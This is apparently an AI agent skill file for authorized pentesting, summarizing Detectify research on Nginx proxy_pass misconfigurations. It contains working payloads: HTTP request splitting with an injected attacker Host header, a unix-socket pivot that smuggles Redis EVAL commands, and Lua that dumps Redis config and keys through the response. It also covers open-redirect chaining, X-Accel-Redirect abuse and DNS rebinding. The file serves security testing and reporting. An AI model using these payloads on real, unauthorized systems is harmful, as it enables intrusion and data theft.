---
name: nginx-middleware-misconfig
description: >
  Use this skill during authorized bug bounty / pentest recon whenever an Nginx (or similar reverse-proxy) target uses proxy_pass with a captured regex group — e.g. paths like /static/(.*)/(.*), /images(.*), /docs/(.*) that forward to S3/GCS buckets, another host, or an internal service. Covers detecting and testing HTTP request splitting via encoded newlines in captured groups, attacker-controlled proxied hostnames, pivoting a captured group into a local unix socket to smuggle commands to backend services like Redis (MSET/EVAL response-smuggling to read output), abusing proxy_intercept_errors plus open redirects to redirect proxy_pass at arbitrary targets, X-Accel-Redirect access to internal-only location blocks, and DNS-rebinding to localhost-restricted blocks. Trigger on requests to review or audit an nginx.conf, find SSRF via reverse proxy, test cloud-storage proxy paths, or "check for middleware misconfigs" — always only against in-scope, authorized targets.
metadata:
  source: https://labs.detectify.com/ethical-hacking/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
---

# Nginx Middleware Misconfiguration Testing

Research summary from Detectify Crowdsource (Frans Rosén, Mathias Karlsson, Fredrik Nordberg Almroth), covering real-world `proxy_pass` misconfigurations found in bug bounty programs. Only apply against explicitly in-scope, authorized targets — several of these techniques (Redis command execution, internal block access) can be destructive or touch out-of-scope internal infrastructure.

## When this applies

The target uses Nginx (or a similar proxy) with a `location` block whose regex captures part of the URI and feeds it into `proxy_pass`, e.g.:

```
location ~ /docs/([^/]*/[^/]*)? {
    proxy_pass https://bucket.s3.amazonaws.com/docs-website/$1.html;
}
```

If you have config access (whitebox/internal review), grep for `proxy_pass` lines that reference a `$1`/`$2` capture group. If blackbox, look for URL patterns that clearly proxy to cloud storage or another origin (`/static/`, `/media/`, `/images/`, `/docs/`, `/assets/`) and probe them with the tests below. [Gixy](https://github.com/yandex/gixy) (Yandex's nginx config static analyzer) catches some but not all of these classes — don't rely on it alone.

## Vulnerability classes and tests

### 1. HTTP request splitting via weak capture regex

If the capture group (e.g. `[^/]*` or `(.*)`) doesn't exclude newlines, encoded `%0d%0a` in the URI survives into the decoded `proxy_pass` target and splits the outbound request into two, letting you inject a fake `Host:` header and body — effectively SSRF/request smuggling against the upstream (commonly an S3/GCS bucket picked by Host header).

**Test:** for a path like `/docs/<capture>`, send:
```
GET /docs/%20HTTP/1.1%0d%0aHost:attacker-bucket%0d%0a%0d%0a HTTP/1.1
Host: target.com
```
If the response reflects content from `attacker-bucket` (a bucket you don't own/expect), you've confirmed splitting — this enables same-origin content injection.

**Also check:** whether the captured value includes a loosely-typed numeric or path segment reused to select a bucket/tenant (e.g. `/images([0-9]+)/` → `companyname-images$1`). Try large/out-of-range numbers to see if you can address a bucket that doesn't officially exist yet, and claim/pre-register it.

### 2. Attacker-controlled proxied hostname

When a capture group becomes *part of the hostname* rather than the path:
```
location ~ /static/(.*)/(.*) {
    proxy_pass http://$1-example.s3.amazonaws.com/$2;
}
```
The first capture directly names the destination — this is typically at least an XSS/content-injection primitive (you control what bucket serves the response), and can be pushed further (see #3).

**Test:** request `/static/<probe>/<file>` and see if `<probe>` changes which backend answers.

### 3. Unix-socket pivot → backend command smuggling (e.g. Redis)

Nginx's `proxy_pass` accepts a `unix:` socket target. If a capture group lands in a spot where you can inject `unix:/path/to.sock:`, you redirect the proxied connection from the intended HTTP backend to a local unix socket — commonly a cache/queue like Redis that trusts local connections.

**Test payload shape** (against the `/static/(.*)/(.*.js)` style location):
```
GET /static/unix:%2ftmp%2fmysocket:TEST/app.js HTTP/1.1
Host: target.com
```
If you have a listener (`socat UNIX-LISTEN:/tmp/mysocket STDOUT` in a lab, or blind timing/OOB in the wild) confirm the raw bytes look like: `GET TEST-example.s3.amazonaws.com/app.js HTTP/1.0`.

**Redis's built-in mitigation:** it drops the connection if the line starts with `POST` or `Host:`. Bypass this by using **the first line only** and a Redis command that takes a variable argument count:

- `MSET key1 value1 key2 ...` — write arbitrary keys, confirms the primitive works.
- `EVAL "<lua>" <numkeys> <args...>` — arbitrary command execution via `redis.call()`/`redis.pcall()` inside the Lua script, e.g.:
  ```
  EVAL /static/unix:%2ftmp%2fmysocket:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app.js
  Host: target.com
  ```

**Reading output back (bypassing the 502):** Nginx returns a generic 502 for non-HTTP upstream responses *unless* the string `HTTP/1.0 200 OK` (or `HTTP/1.1 200 OK`) appears anywhere in the response — then the full body is forwarded to the client. Use Lua string concatenation to append that marker to whatever Redis data you want exfiltrated:
```lua
return (table.concat(redis.call("config","get","*"),"\n") .. " HTTP/1.1 200 OK\r\n\r\n")
```
URL-encode this into the EVAL path as above to dump config, keys, etc. through the HTTP response.

**Impact / stop condition:** confirming `MSET`/`EVAL` write access is enough to prove the finding for a report — don't run destructive commands (`FLUSHALL`, `CONFIG SET` changes to a shared prod instance, `SHUTDOWN`) against real targets. Use a local Redis/socat lab to develop the exact payload, then run only the minimal confirming request against the live target.

### 4. Abusing proxy_intercept_errors + open redirects

Some configs "simulate" following redirects by intercepting 301/302/307/303 and re-proxying the `Location` header value:
```
location ~ /images(.*) {
    proxy_intercept_errors on;
    proxy_pass http://example.com$1;
    error_page 301 302 307 303 = @handle_redirects;
}
location @handle_redirects {
    set $orig_loc $upstream_http_location;
    proxy_pass $orig_loc;
}
```
If the origin host has an open redirect (or you control it), the `Location` header becomes a **second, unrestricted `proxy_pass` target** — chain this with #3 to redirect straight into a unix socket, since the redirect response just needs to happen on the same request method you're sending (EVAL, MSET, etc. — an oddball method most apps will happily 301 without checking).

**Test:** find/host an open redirect reachable through the proxied path, point it at `unix:/path:<redis payload>`, and confirm the socket receives it.

### 5. X-Accel-Redirect into internal-only blocks

`internal;` location blocks are meant to be unreachable directly, but an upstream response with an `X-Accel-Redirect: /internal_only/...` header makes Nginx serve them anyway. If any proxied backend lets you influence response headers (even indirectly, e.g. via a reflected header or another SSRF), check whether you can set `X-Accel-Redirect` and reach:
```
location /internal_only/ {
    internal;
    root /var/www/html/internal/;
}
```

### 6. DNS-rebinding into localhost-restricted blocks

Blocks gated with `allow 127.0.0.1; deny all;` trust the connecting IP, not the Host header. If you can make a DNS name you control resolve to `127.0.0.1` (classic rebinding) and reach it through the same Nginx instance, the `allow 127.0.0.1` block may open up to you.

## Reporting checklist

For each confirmed finding, capture:
- The exact request (with all encoding) and the raw response/socket bytes proving impact.
- Which class (1–6 above) it falls under.
- A minimal, non-destructive PoC — favor read-only commands (`CONFIG GET`, `GET <key>`) over anything that mutates shared state.
- Whether Gixy would have caught the underlying nginx config bug (useful context for the report, shows you understand root cause vs. just the exploit).
